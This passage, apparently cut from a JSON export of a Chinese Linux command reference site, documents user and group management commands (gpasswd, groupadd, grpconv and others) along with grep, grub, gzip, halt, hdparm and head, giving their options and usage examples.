实例\n\n如系统有个peter账户，该账户本身不是groupname群组的成员，使用newgrp需要输入密码即可。\n\n```shell\ngpasswd groupname\n```\n\n让使用者暂时加入成为该组成员，之后peter建立的文件group也会是groupname。所以该方式可以暂时让peter建立文件时使用其他的组，而不是peter本身所在的组。\n\n所以使用`gpasswd groupname`设定密码，就是让知道该群组密码的人可以暂时切换具备groupname群组功能的。\n\n```shell\ngpasswd -A peter users\n```\n\n这样peter就是users群组的管理员，就可以执行下面的操作:\n\n```shell\ngpasswd -a mary users\ngpasswd -a allen users\n```\n\n注意：添加用户到某一个组 可以使用`usermod -G group_name user_name`这个命令可以添加一个用户到指定的组，但是以前添加的组就会清空掉。\n\n所以想要添加一个用户到一个组，同时保留以前添加的组时，请使用gpasswd这个命令来添加操作用户：\n\n```shell\ngpasswd -a user_name group_name\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","gpasswd"]},{"title":"【Linux 命令】gpm","url":"/linux-command/gpm/","content":"\n提供文字模式下的滑鼠事件处理\n\n## 补充说明\n\n**gpm命令** 是Linux的虚拟控制台下的鼠标服务器，用于在虚拟控制台下实现鼠标复制和粘贴文本的功能。\n\n###  语法\n\n```shell\ngpm(选项)\n```\n\n###  选项\n\n```shell\n-a：设置加速值；\n-b：设置波特率；\n-B：设置鼠标按键次序；\n-m：指定鼠标设备文件；\n-t：设置鼠标类型。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","gpm"]},{"title":"【Linux 命令】grep","url":"/linux-command/grep/","content":"\n强大的文本搜索工具\n\n## 补充说明\n\n**grep** （global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。用于过滤/搜索的特定字符。可使用正则表达式能配合多种命令使用，使用上十分灵活。\n\n###  选项 \n\n```shell\n-a --text  # 不要忽略二进制数据。\n-A <显示行数>   --after-context=<显示行数>   # 除了显示符合范本样式的那一行之外，并显示该行之后的内容。\n-b --byte-offset                           # 在显示符合范本样式的那一行之外，并显示该行之前的内容。\n-B<显示行数>   --before-context=<显示行数>   # 除了显示符合样式的那一行之外，并显示该行之前的内容。\n-c --count    # 计算符合范本样式的列数。\n-C<显示行数> --context=<显示行数>或-<显示行数> # 除了显示符合范本样式的那一列之外，并显示该列之前后的内容。\n-d<进行动作> --directories=<动作>  # 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep命令将回报信息并停止动作。\n-e<范本样式> --regexp=<范本样式>   # 指定字符串作为查找文件内容的范本样式。\n-E --extended-regexp             # 将范本样式为延伸的普通表示法来使用，意味着使用能使用扩展正则表达式。\n-f<范本文件> --file=<规则文件>     # 指定范本文件，其内容有一个或多个范本样式，让grep查找符合范本条件的文件内容，格式为每一列的范本样式。\n-F --fixed-regexp   # 将范本样式视为固定字符串的列表。\n-G --basic-regexp   # 将范本样式视为普通的表示法来使用。\n-h --no-filename    # 在显示符合范本样式的那一列之前，不标示该列所属的文件名称。\n-H --with-filename  # 在显示符合范本样式的那一列之前，标示该列的文件名称。\n-i --ignore-case    # 忽略字符大小写的差别。\n-l --file-with-matches   # 列出文件内容符合指定的范本样式的文件名称。\n-L --files-without-match # 列出文件内容不符合指定的范本样式的文件名称。\n-n --line-number         # 在显示符合范本样式的那一列之前，标示出该列的编号。\n-P --perl-regexp         # PATTERN 是一个 Perl 正则表达式\n-q --quiet或--silent     # 不显示任何信息。\n-R/-r  --recursive       # 此参数的效果和指定“-d recurse”参数相同。\n-s --no-messages  # 不显示错误信息。\n-v --revert-match # 反转查找。\n-V --version      # 显示版本信息。   \n-w --word-regexp  # 只显示全字符合的列。\n-x --line-regexp  # 只显示全列符合的列。\n-y # 此参数效果跟“-i”相同。\n-o # 只输出文件中匹配到的部分。\n-m <num> --max-count=<num> # 找到num行结果后停止查找，用来限制匹配行数\n```\n\n### 规则表达式\n\n```shell\n^    # 锚定行的开始 如：'^grep'匹配所有以grep开头的行。    \n$    # 锚定行的结束 如：'grep$' 匹配所有以grep结尾的行。\n.    # 匹配一个非换行符的字符 如：'gr.p'匹配gr后接一个任意字符，然后是p。    \n*    # 匹配零个或多个先前字符 如：'*grep'匹配所有一个或多个空格后紧跟grep的行。    \n.*   # 一起用代表任意字符。   \n[]   # 匹配一个指定范围内的字符，如'[Gg]rep'匹配Grep和grep。    \n[^]  # 匹配一个不在指定范围内的字符，如：'[^A-FH-Z]rep'匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。    \n\\(..\\)  # 标记匹配字符，如'\\(love\\)'，love被标记为1。    \n\\<      # 锚定单词的开始，如:'\\<grep'匹配包含以grep开头的单词的行。    \n\\>      # 锚定单词的结束，如'grep\\>'匹配包含以grep结尾的单词的行。    \nx\\{m\\}  # 重复字符x，m次，如：'0\\{5\\}'匹配包含5个o的行。    \nx\\{m,\\}   # 重复字符x,至少m次，如：'o\\{5,\\}'匹配至少有5个o的行。    \nx\\{m,n\\}  # 重复字符x，至少m次，不多于n次，如：'o\\{5,10\\}'匹配5--10个o的行。   \n\\w    # 匹配文字和数字字符，也就是[A-Za-z0-9]，如：'G\\w*p'匹配以G后跟零个或多个文字或数字字符，然后是p。   \n\\W    # \\w的反置形式，匹配一个或多个非单词字符，如点号句号等。   \n\\b    # 单词锁定符，如: '\\bgrep\\b'只匹配grep。  \n```\n\n## grep命令常见用法  \n\n在文件中搜索一个单词，命令会返回一个包含 **“match_pattern”** 的文本行：\n\n```shell\ngrep match_pattern file_name\ngrep \"match_pattern\" file_name\n```\n\n在多个文件中查找：\n\n```shell\ngrep \"match_pattern\" file_1 file_2 file_3 ...\n```\n\n输出除之外的所有行  **-v**  选项：\n\n```shell\ngrep -v \"match_pattern\" file_name\n```\n\n标记匹配颜色  **--color=auto**  选项：\n\n```shell\ngrep \"match_pattern\" file_name --color=auto\n```\n\n使用正则表达式  **-E**  选项：\n\n```shell\ngrep -E \"[1-9]+\"\n# 或\negrep \"[1-9]+\"\n```\n使用正则表达式  **-P**  选项：\n\n```shell\ngrep -P \"(\\d{3}\\-){2}\\d{4}\" file_name\n```\n\n\n只输出文件中匹配到的部分  **-o**  选项：\n\n```shell\necho this is a test line. | grep -o -E \"[a-z]+\\.\"\nline.\n\necho this is a test line. | egrep -o \"[a-z]+\\.\"\nline.\n```\n\n统计文件或者文本中包含匹配字符串的行数  **-c**  选项：\n\n```shell\ngrep -c \"text\" file_name\n```\n\n输出包含匹配字符串的行数  **-n**  选项：\n\n```shell\ngrep \"text\" -n file_name\n# 或\ncat file_name | grep \"text\" -n\n\n#多个文件\ngrep \"text\" -n file_1 file_2\n```\n\n打印样式匹配所位于的字符或字节偏移：\n\n```shell\necho gun is not unix | grep -b -o \"not\"\n7:not\n#一行中字符串的字符便宜是从该行的第一个字符开始计算，起始值为0。选项  **-b -o**  一般总是配合使用。\n```\n\n搜索多个文件并查找匹配文本在哪些文件中：\n\n```shell\ngrep -l \"text\" file1 file2 file3...\n```\n\n###  grep递归搜索文件 \n\n在多级目录中对文本进行递归搜索：\n\n```shell\ngrep \"text\" . -r -n\n# .表示当前目录。\n```\n\n忽略匹配样式中的字符大小写：\n\n```shell\necho \"hello world\" | grep -i \"HELLO\"\n# hello\n```\n\n选项  **-e**  制动多个匹配样式：\n\n```shell\necho this is a text line | grep -e \"is\" -e \"line\" -o\nis\nline\n\n#也可以使用 **-f** 选项来匹配多个样式，在样式文件中逐行写出需要匹配的字符。\ncat patfile\naaa\nbbb\n\necho aaa bbb ccc ddd eee | grep -f patfile -o\n```\n\n在grep搜索结果中包括或者排除指定文件：\n\n```shell\n# 只在目录中所有的.php和.html文件中递归搜索字符\"main()\"\ngrep \"main()\" . -r --include *.{php,html}\n\n# 在搜索结果中排除所有README文件\ngrep \"main()\" . -r --exclude \"README\"\n\n# 在搜索结果中排除filelist文件列表里的文件\ngrep \"main()\" . -r --exclude-from filelist\n\n```\n\n使用0值字节后缀的grep与xargs：\n\n```shell\n# 测试文件：\necho \"aaa\" > file1\necho \"bbb\" > file2\necho \"aaa\" > file3\n\ngrep \"aaa\" file* -lZ | xargs -0 rm\n\n# 执行后会删除file1和file3，grep输出用-Z选项来指定以0值字节作为终结符文件名（\\0），xargs -0 读取输入并用0值字节终结符分隔文件名，然后删除匹配文件，-Z通常和-l结合使用。\n```\n\ngrep静默输出：\n\n```shell\ngrep -q \"test\" filename\n# 不会输出任何信息，如果命令运行成功返回0，失败则返回非0值。一般用于条件测试。\n```\n\n打印出匹配文本之前或者之后的行：\n\n```shell\n# 显示匹配某个结果之后的3行，使用 -A 选项：\nseq 10 | grep \"5\" -A 3\n5\n6\n7\n8\n\n# 显示匹配某个结果之前的3行，使用 -B 选项：\nseq 10 | grep \"5\" -B 3\n2\n3\n4\n5\n\n# 显示匹配某个结果的前三行和后三行，使用 -C 选项：\nseq 10 | grep \"5\" -C 3\n2\n3\n4\n5\n6\n7\n8\n\n# 如果匹配结果有多个，会用“--”作为各匹配结果之间的分隔符：\necho -e \"a\\nb\\nc\\na\\nb\\nc\" | grep a -A 1\na\nb\n--\na\nb\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","grep"]},{"title":"【Linux 命令】groupadd","url":"/linux-command/groupadd/","content":"\n用于创建一个新的工作组\n\n## 补充说明\n\n**groupadd命令** 用于创建一个新的工作组，新工作组的信息将被添加到系统文件中。\n\n###  语法\n\n```shell\ngroupadd(选项)(参数)\n```\n\n###  选项\n\n```shell\n-g：指定新建工作组的id；\n-r：创建系统工作组，系统工作组的组ID小于500；\n-K：覆盖配置文件“/ect/login.defs”；\n-o：允许添加组ID号不唯一的工作组。\n```\n\n###  参数\n\n组名：指定新建工作组的组名。\n\n###  实例\n\n建立一个新组，并设置组ID加入系统：\n\n```shell\ngroupadd -g 344 jsdigname\n```\n\n此时在`/etc/passwd`文件中产生一个组ID（GID）是344的项目。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","groupadd"]},{"title":"【Linux 命令】groupdel","url":"/linux-command/groupdel/","content":"\n用于删除指定的工作组\n\n## 补充说明\n\n**groupdel命令** 用于删除指定的工作组，本命令要修改的系统文件包括/ect/group和/ect/gshadow。若该群组中仍包括某些用户，则必须先删除这些用户后，方能删除群组。\n\n###  语法\n\n```shell\ngroupdel(参数)\n```\n\n###  参数\n\n组：要删除的工作组名。\n\n###  实例\n\n```shell\ngroupadd damon  //创建damon工作组\ngroupdel damon  //删除这个工作组\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","groupdel"]},{"title":"【Linux 命令】groupmod","url":"/linux-command/groupmod/","content":"\n更改群组识别码或名称\n\n## 补充说明\n\n**groupmod命令** 更改群组识别码或名称。需要更改群组的识别码或名称时，可用groupmod指令来完成这项工作。\n\n###  语法\n\n```shell\ngroupmod(选项)(参数)\n```\n\n###  选项\n\n```shell\n-g<群组识别码>：设置欲使用的群组识别码；\n-o：重复使用群组识别码；\n-n<新群组名称>：设置欲使用的群组名称。\n```\n\n###  参数\n\n组名：指定要修改的工作的组名。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","groupmod"]},{"title":"【Linux 命令】groups","url":"/linux-command/groups/","content":"\n打印指定用户所在组的名称。\n\n## 概要\n\n```shell\ngroups [OPTION]... [username]...\n```\n\n## 主要用途\n\n- 打印指定用户所在组的名称。\n\n## 选项\n\n```shell\n--help       显示帮助信息并退出。\n--version    显示版本信息并退出。\n```\n\n## 参数\n\nusername（可选）：可以是一到多个，不提供时默认为当前用户。\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n显示linux用户所属的组\n\n```shell\n[root@localhost ~]# groups linux\nlinux : linux adm dialout cdrom plugdev lpadmin admin sambashare\n```\n\n### 注意\n\n1. 该命令等价于 `id -Gn`。\n2. 每个用户属于`/etc/passwd`中指定的一个组和在`/etc/group`中指定的其他组。\n3. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 groups`，`info coreutils 'groups invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","groups"]},{"title":"【Linux 命令】grpck","url":"/linux-command/grpck/","content":"\n用于验证组文件的完整性\n\n## 补充说明\n\n**grpck命令** 用于验证组文件的完整性，在验证之前，需要先锁定（lock）组文件`/etc/group`和`/etc/shadow`。\n\ngrpck命令检查数据是否正确存放，每条记录是否都包含足够的信息，是否有一个唯一的组名，是否包含正确的用户，是否正确设置了组的管理员等。grpck检查发现错误以后，在命令行提示用户是否删除错误的记录。如果用户没有明确回答删除记录，grpck终止运行。\n\n###  语法\n\n```shell\ngrpck(选项)\n```\n\n###  选项\n\n```shell\n-r：只读模式；\n-s：排序组id。\n```\n\n###  实例\n\n对组账号和影子文件进行验证：\n\n```shell\ngrpck   # 必须以管理员身份运行\ngrpck /etc/group /etc/gshadow   # 后面两句一样，如果没有输出信息，则表示没有错误。\n```\n\n测试错误的实例：\n\n```shell\n**echo check_user:x: >> /etc/group    # 添加一行错误的格式数据\ncat /etc/group | grep check_user**\ncheck_user:x:  # 这儿GID字段为空，是错误的。\n\n **grpck /etc/group** \ninvalid group file entry\ndelete line 'check_user:x:'? y      # 提示是否删除\ngrpck: the files have been updated  # 这时已经删除了错误的行，提示文件已经更新。\n\n **cat /etc/group  | grep check_user   # 没有查到，已经删除了。** \n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","grpck"]},{"title":"【Linux 命令】grpconv","url":"/linux-command/grpconv/","content":"\n用来开启群组的投影密码\n\n## 补充说明\n\n**grpconv命令** 用来开启群组的投影密码。Linux系统里的用户和群组密码，分别存放在`/etc`目录下的passwd和group文件中。因系统运作所需，任何人都得以读取它们，造成安全上的破绽。投影密码将文件内的密码改存在`/etc`目录下的shadow和gshadow文件内，只允许系统管理者读取，同时把原密码置换为\"x\"字符。投影密码的功能可随时开启或关闭，您只需执行grpconv指令就能开启群组投影密码。\n\n###  语法\n\n```shell\ngrpconv\n```\n\n###  实例\n\n设置cdy组密码\n\n```shell\ngroupmod --password 123456 cdy\ncat /etc/group | grep cdy\ncdy:123456:1000:     # 看出密码是123456\n```\n\n启动影子系统\n\n```shell\ngrpconv\ncat /etc/group |  grep cdy\ncdy:x:1000:      # 看出密码段已经被x替代\n\ncat /etc/gshadow | grep cdy\ncdy:123456::      # 已经移到影子文件了\n```\n\n注：gshadow, shadow只有root权限才可以查看。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","grpconv"]},{"title":"【Linux 命令】grpunconv","url":"/linux-command/grpunconv/","content":"\n用来关闭群组的投影密码\n\n## 补充说明\n\n**grpunconv命令** 用来关闭群组的投影密码。它会把密码从gshadow文件内，回存到group文件里。\n\n###  语法\n\n```shell\ngrpunconv\n```\n\n###  实例\n\n未关闭的情况\n\n```shell\ncat /etc/gshadow | grep cdy\ncdy:123456::\n```\n\n关闭影子密码\n\n```shell\ncat /etc/gshadow\ncat: /etc/gshadow: 没有那个文件或目录\n```\n\n查看密码已经复制到`/etc/group`中了。\n\n```shell\ncat /etc/group | grep cdy\ncdy:123456:1000:\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","grpunconv"]},{"title":"【Linux 命令】grub","url":"/linux-command/grub/","content":"\n多重引导程序grub的命令行shell工具\n\n## 补充说明\n\n**grub命令** 是多重引导程序grub的命令行shell工具。\n\n###  语法\n\n```shell\ngrub(选项)\n```\n\n###  选项\n\n```shell\n--batch：打开批处理模式；\n--boot-drive=<驱动器>：指定stage2的引导驱动器；\n--config-file<配置文件>：指定stage2的配置文件；\n--device-map=<文件>：指定设备的映射文件；\n--help：显示帮助信息；\n--install-partition=<分区>：指定stage2安装分区；\n--no-config-file：不使用配置文件；\n--no-pager：不使用内部分页器；\n--preset-menu：使用预设菜单；\n--probe-second-floppy：检测第二个软盘驱动器；\n--read-only：只读模式。\n```\n\n###  实例\n\n利用grub命令来启动损坏的Linux系统，可能你的电脑因为某些原因损坏不能自动启动了。当然原因很多，可能的现象也很多。\n\n这里说一下这种情况下的处理方法，即：屏幕上提示`grub>`，但你的硬盘上数据没有丢失，各分区都是好的。这种情况是你的grub信息损坏了，但比较严重的是系统启动不了。\n\n当然，在正常启动情况下，屏幕上出现grub的启动项选择菜单时按`c`键也是可以进入`grub>`状态的。这时候我们需要用grub的命令来手工启动系统。\n\n只需要用到四个命令boot、kernel、initrd、boot。\n\n但grub本身命令很多，比如查看文件内容的cat ，你输入help会得到。\n\n首先，输入“ root (hd ” ，然后按两次 TAB 键； /* 这会列出你电脑上可能的磁盘设备，硬盘为 hd0/hd1 或 sd0/sd1 等 */\n\n然后，选择你的安装 Linux 系统的硬盘，比如 hd0 ，输入 “ root (hd0, ” 再按两次 TAB 键； /* 这会列出你的第一块硬盘上的分区情况，你会知道哪个是 swap 交换分区， 0x82 ，哪个是 Linux 分区 0x83 */\n\n选择你认为可能的 /boot 目录所在的分区， 输入`root (hd0, 1)`回车；\n\n接着，输入`cat /boot/vm`， 按两次 TAB 键，如果出现一些 vm 开头的文件，比如 vmlinuz-2.6.15-26-386 说明这里是 /boot 所在的分区。\n\n删除上一次的输入，再输入`cat /boot/initrd`，按两次 TAB 键，如果出现一些 initrd 开头的文件，比如 initrd.img-2.6.15-26-386 说明这个 /boot 所在的分区有 initrd ，即 ramdisk 镜像；\n\n删除上一次的输入，再输入`cat /sbin/init`，按两次 TAB 键，如果出现一些 init 开头的文件，比如`/sbin/init`说明这个分区是`/`所在的分区；\n\n如果没有出现`/sbin/init`文件，说明`(hd0,1)`分区仅仅是`/boot`分区而不是`/`分区。重新输入`root (hd0,N)`命令，这里 N 是某个 Linux 分区，然后再试`cat /sbin/init`， 直到屏幕上出现`/sbin/init`，说明你找到了`/`分区，严格来说，应该是`/sbin`目录所在的分区；\n\n依次输入命令：\n\n```shell\nroot (hd0,1)   /* 假设 /dev/hda2 是你的 /boot 所在的分区 */\nkernel /boot/vmlinuz-2.6.15-26-386 ro dev=/dev/hda3    /* 假设 /dev/hda3 是你的 / 所在的分区 */\ninitrd /boot/initrd.img-2.6.15-26-386\nboot\n```\n\n即可启动系统。\n\n这里的关键问题是如何确定系统的几个分区：`/boot` `/` `/sbin`\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","grub"]},{"title":"【Linux 命令】gunzip","url":"/linux-command/gunzip/","content":"\n用来解压缩文件\n\n## 补充说明\n\n**gunzip命令** 用来解压缩文件。gunzip是个使用广泛的解压缩程序，它用于解开被gzip压缩过的文件，这些压缩文件预设最后的扩展名为.gz。事实上gunzip就是gzip的硬连接，因此不论是压缩或解压缩，都可通过gzip指令单独完成。\n\n###  语法\n\n```shell\ngunzip(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a或——ascii：使用ASCII文字模式；\n-c或--stdout或--to-stdout：把解压后的文件输出到标准输出设备；\n-f或-force：强行解开压缩文件，不理会文件名称或硬连接是否存在以及该文件是否为符号连接；\n-h或——help：在线帮助；\n-l或——list：列出压缩文件的相关信息；\n-L或——license：显示版本与版权信息；\n-n或--no-name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其忽略不予处理；\n-N或——name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其回存到解开的文件上；\n-q或——quiet：不显示警告信息；\n-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；\n-S或<压缩字尾字符串>或----suffix<压缩字尾字符串>：更改压缩字尾字符串；\n-t或——test：测试压缩文件是否正确无误；\n-v或——verbose：显示指令执行过程；\n-V或——version：显示版本信息；\n```\n\n###  参数\n\n文件列表：指定要解压缩的压缩包。\n\n###  实例\n\n首先将`/etc`目录下的所有文件以及子目录进行压缩，备份压缩包etc.zip到`/opt`目录，然后对etc.zip文件进行gzip压缩，设置gzip的压缩级别为9。\n\n```shell\nzip –r /opt/etc.zip /etc\ngzip -9v /opt/etc.zip\n```\n\n查看上述etc.zip.gz文件的压缩信息。\n\n```shell\ngzip -l /opt/etc.zip.gz\ncompressed        uncompressed ratio uncompressed_name\n11938745            12767265   6.5% /opt/etc.zip\n```\n\n解压上述etc.zip.gz文件到当前目录。\n\n```shell\n[root@mylinux ~]#gzip –d /opt/etc.zip.gz \n或者执行\n[root@mylinux ~]#gunzip /opt/etc.zip.gz\n```\n\n通过上面的示例可以知道`gzip –d`等价于`gunzip`命令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","gunzip"]},{"title":"【Linux 命令】gzexe","url":"/linux-command/gzexe/","content":"\n用来压缩可执行文件\n\n## 补充说明\n\n**gzexe命令** 用来压缩可执行文件，压缩后的文件仍然为可执行文件，在执行时进行自动解压缩。当您去执行被压缩过的执行文件时，该文件会自动解压然后继续执行，和使用一般的执行文件相同。这个命令也可以看成是gunzip命令的一个扩展。\n\n###  语法\n\n```shell\ngzexe(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：解压缩被gzexe压缩过的可执行文件。\n```\n\n###  参数\n\n文件：指定需要压缩的可执行文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","gzexe"]},{"title":"【Linux 命令】gzip","url":"/linux-command/gzip/","content":"\n用来压缩文件\n\n## 补充说明\n\n**gzip命令** 用来压缩文件。gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多处“.gz”扩展名。\n\ngzip是在Linux系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。gzip不仅可以用来压缩大的、较少使用的文件以节省磁盘空间，还可以和tar命令一起构成Linux操作系统中比较流行的压缩文件格式。据统计，gzip命令对文本文件有60%～70%的压缩率。减少文件大小有两个明显的好处，一是可以减少存储空间，二是通过网络传输文件时，可以减少传输的时间。\n\n### 语法\n\n```shell\ngzip(选项)(参数)\n```\n\n### 选项\n\n```shell\n-a或——ascii：使用ASCII文字模式；\n-d或--decompress或----uncompress：解开压缩文件；\n-f或——force：强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；\n-h或——help：在线帮助；\n-l或——list：列出压缩文件的相关信息；\n-L或——license：显示版本与版权信息；\n-n或--no-name：压缩文件时，不保存原来的文件名称及时间戳记；\n-N或——name：压缩文件时，保存原来的文件名称及时间戳记；\n-q或——quiet：不显示警告信息；\n-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；\n-S或<压缩字尾字符串>或----suffix<压缩字尾字符串>：更改压缩字尾字符串；\n-t或——test：测试压缩文件是否正确无误；\n-v或——verbose：显示指令执行过程；\n-V或——version：显示版本信息；\n-<压缩效率>：压缩效率是一个介于1~9的数值，预设值为“6”，指定愈大的数值，压缩效率就会愈高；\n--best：此参数的效果和指定“-9”参数相同；\n--fast：此参数的效果和指定“-1”参数相同。\n-num 用指定的数字num调整压缩的速度，-1或--fast表示最快压缩方法（低压缩比），-9或--best表示最慢压缩方法（高压缩比）。系统缺省值为6。\n-c或--stdout或--to-stdout：保留原始文件，生成标准输出流（结合重定向使用）。\n```\n\n### 参数\n\n文件列表：指定要压缩的文件列表。\n\n### 实例\n\n把test6目录下的每个文件压缩成.gz文件\n\n```shell\ngzip *\n```\n\n把上例中每个压缩的文件解压，并列出详细的信息\n\n```shell\ngzip -dv *\n```\n\n详细显示例1中每个压缩的文件的信息，并不解压\n\n```shell\ngzip -l *\n```\n\n压缩一个tar备份文件，此时压缩文件的扩展名为.tar.gz\n\n```shell\ngzip -r log.tar\n```\n\n递归的压缩目录\n\n```shell\ngzip -rv test6\n```\n\n这样，所有test下面的文件都变成了*.gz，目录依然存在只是目录里面的文件相应变成了*.gz.这就是压缩，和打包不同。因为是对目录操作，所以需要加上-r选项，这样也可以对子目录进行递归了。\n\n递归地解压目录\n\n```shell\ngzip -dr test6\n```\n\n保留原始文件，把压缩/解压流重定向到新文件\n\n```shell\ngzip -c aa > aa.gz\ngzip -dc bb.gz > bb\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","gzip"]},{"title":"【Linux 命令】halt","url":"/linux-command/halt/","content":"\n关闭正在运行的Linux操作系统\n\n## 补充说明\n\n**halt命令** 用来关闭正在运行的Linux操作系统。halt命令会先检测系统的runlevel，若runlevel为0或6，则关闭系统，否则即调用shutdown来关闭系统。\n\n###  语法\n\n```shell\nhalt(选项)\n```\n\n###  选项\n\n```shell\n-d：不要在wtmp中记录；\n-f：不论目前的runlevel为何，不调用shutdown即强制关闭系统；\n-i：在halt之前，关闭全部的网络界面；\n-n：halt前，不用先执行sync；\n-p：halt之后，执行poweroff；\n-w：仅在wtmp中记录，而不实际结束系统。\n```\n\n###  实例\n\n```shell\nhalt -p     # 关闭系统后关闭电源。\nhalt -d     # 关闭系统，但不留下纪录。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","halt"]},{"title":"【Linux 命令】hdparm","url":"/linux-command/hdparm/","content":"\n显示与设定硬盘的参数\n\n## 补充说明\n\n**hdparm命令** 提供了一个命令行的接口用于读取和设置IDE或SCSI硬盘参数。\n\n###  语法\n\n```shell\nhdparm(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a<快取分区>：设定读取文件时，预先存入块区的分区数，若不加上<快取分区>选项，则显示目前的设定；\n-A<0或1>：启动或关闭读取文件时的快取功能；\n-c<I/O模式>：设定IDE32位I/O模式；\n-C：检测IDE硬盘的电源管理模式；\n-d<0或1>：设定磁盘的DMA模式；\n-f：将内存缓冲区的数据写入硬盘，并清楚缓冲区；\n-g：显示硬盘的磁轨，磁头，磁区等参数；\n-h：显示帮助；\n-i：显示硬盘的硬件规格信息，这些信息是在开机时由硬盘本身所提供；\n-I：直接读取硬盘所提供的硬件规格信息；\n-k<0或1>：重设硬盘时，保留-dmu参数的设定；\n-K<0或1>：重设硬盘时，保留-APSWXZ参数的设定；\n-m<磁区数>：设定硬盘多重分区存取的分区数；\n-n<0或1>：忽略硬盘写入时所发生的错误；\n-p<PIO模式>：设定硬盘的PIO模式；\n-P<磁区数>：设定硬盘内部快取的分区数；\n-q:在执行后续的参数时，不在屏幕上显示任何信息；\n-r<0或1>:设定硬盘的读写模式；\n-S<时间>:设定硬盘进入省电模式前的等待时间；\n-t;评估硬盘的读取效率；\n-T：平谷硬盘快取的读取效率；\n-u<0或1>：在硬盘存取时，允许其他中断要求同时执行；\n-v：显示硬盘的相关设定；\n-w<0或1>：设定硬盘的写入快取；\n-X<传输模式>：设定硬盘的传输模式；\n-y：使IDE硬盘进入省电模式；\n-Y：使IDE硬盘进入睡眠模式；\n-Z：关闭某些Seagate硬盘的自动省电功能。\n```\n\n###  参数\n\n设备文件：指定id驱动对应的设备文件名。\n\n###  实例\n\n显示硬盘的相关设置：\n\n```shell\nhdparm /dev/sda\n/dev/sda:\nIO_support = 0 (default 16-bit)\nreadonly = 0 (off)\nreadahead = 256 (on)\ngeometry = 19457［柱面数］/255［磁头数］/63［扇区数］, sectors = 312581808［总扇区数］, start = 0［起始扇区数］\n\n```shell\n\n显示硬盘的柱面、磁头、扇区数：\n\n```shell\nhdparm -g /dev/sda\n/dev/sda:\ngeometry = 19457［柱面数］/255［磁头数］/63［扇区数］, sectors = 312581808［总扇区数］, start = 0［起始扇区数］\n```\n\n测试硬盘的读取速度：\n\n```shell\nhdparm -T /dev/sda\n/dev/sda:\n Timing cached reads:   4684 MB in  2.00 seconds = 2342.92 MB/sec\n```\n\n测试硬盘缓存的读取速度：\n\n```shell\nhdparm -T /dev/xvda\n/dev/xvda:\nTiming cached reads: 11154 MB in 1.98 seconds = 5633.44 MB/sec\n```\n\n检测硬盘的电源管理模式：\n\n```shell\nhdparm -C /dev/sda\n/dev/sda:\ndrive state is: standby [省电模式]\n```\n\n查询并设置硬盘多重扇区存取的扇区数，以增进硬盘的存取效率：\n\n```shell\nhdparm -m /dev/sda\nhdparm -m    #参数值为整数值如8 /dev/sda\n```\n\n **附：硬盘坏道修复方法** \n\n```shell\n检查：smartctl -l selftest /dev/sda\n卸载：umount /dev/sda*\n修复：badblocks /dev/sda\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","hdparm"]},{"title":"【Linux 命令】head","url":"/linux-command/head/","content":"\n显示文件的开头部分。\n\n## 概要\n\n```shell\nhead [OPTION]... [FILE]...\n```\n\n## 主要用途\n\n- 在未指定行数时默认显示前10行。\n- 处理多个文件时会在各个文件之前附加含有文件名的行。\n- 当没有文件或文件为`-`时，读取标准输入。\n\n## 选项\n\n```shell\n-c, --bytes=[-]NUM       显示前NUM字节；如果NUM前有\"-\"，那么会打印除了文件末尾的NUM字节以外的其他内容。\n-n, --lines=[-]NUM       显示前NUM行而不是默认的10行；如果NUM前有\"-\"，那么会打印除了文件末尾的NUM行以外的其他行。\n-q, --quiet, --silent    不打印文件名行。\n-v, --verbose            总是打印文件名行。\n-z, --zero-terminated    行终止符为NUL而不是换行符。\n--help                   显示帮助信息并退出。\n--version                显示版本信息并退出。\n\nNUM可以有一个乘数后缀：\nb 512\nkB 1000\nk 1024\nMB 1000*1000\nM 1024*1024\nGB 1000*1000*1000\nG 1024*1024*1024\nT、P、E、Z、Y等以此类推。\n\n也可以使用二进制前缀：\nKiB=K\nMiB=M\n以此类推。\n```\n\n## 参数\n\nFILE（可选）：要处理的文件，可以为一或多个。\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n```shell\n# 查看历史文件的前6行：\n[user2@pc ~]$ head -n 6 ~/.bash_history\n#1575425555\ncd ~\n#1575425558\nls -lh\n#1575425562\nvi ~/Desktop/ZhuangZhu-74.txt\n```\n\n```shell\n# 查看多个文件：\n[user2@pc ~]$ head 